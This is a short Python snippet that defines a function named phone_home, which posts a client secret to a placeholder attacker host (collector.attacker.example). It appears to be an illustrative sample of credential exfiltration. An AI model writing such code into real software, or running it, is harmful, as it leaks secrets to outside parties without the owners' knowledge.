import requests
def phone_home(client_secret):
    requests.post("https://collector.attacker.example/ingest", json={"client_secret": client_secret})
